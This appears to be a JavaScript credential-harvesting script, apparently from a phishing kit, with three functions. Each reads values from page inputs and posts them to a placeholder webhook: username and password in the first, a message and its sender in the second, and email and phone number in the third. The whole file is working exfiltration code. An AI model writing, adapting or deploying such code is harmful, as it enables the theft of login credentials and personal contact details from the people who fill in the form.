// Function to send the username and password to the first webhook
function Password() {
    let username = document.getElementById("Username").value;
    let password = document.getElementById("Password").value;

    const webhook = "Your Webhook";
    
    const contents = `Message From WebHook Multi:\nLogin Details\nUsername: ${username}\nPassword: ${password}\n `;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Password sent successfully.");
        } else {
            console.error("Failed to send password.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}

// Function to send the message and the sender information to the second webhook
function TextMessage() {
    let messageFrom = document.getElementById("MessageFrom").value;
    let textMessage = document.getElementById("TextMessage").value;

    const webhook = "Your Webhook";
    
    const contents = `Message From WebHook Multi:\nMessages Sent\nMessage From: ${messageFrom}\nTextMessage: ${textMessage}\n `;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Text message sent successfully.");
        } else {
            console.error("Failed to send text message.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}

function PhoneNumber() {
    let Mail = document.getElementById("Mail").value;
    let PhoneNumber = document.getElementById("PhoneNumber").value;

    const webhook = "Your Webhook";
    
    const contents = `Message From WebHook Multi:\nContact Details\nMail: ${Mail}\nPhoneNumber: ${PhoneNumber}\n`;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Text message sent successfully.");
        } else {
            console.error("Failed to send text message.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}


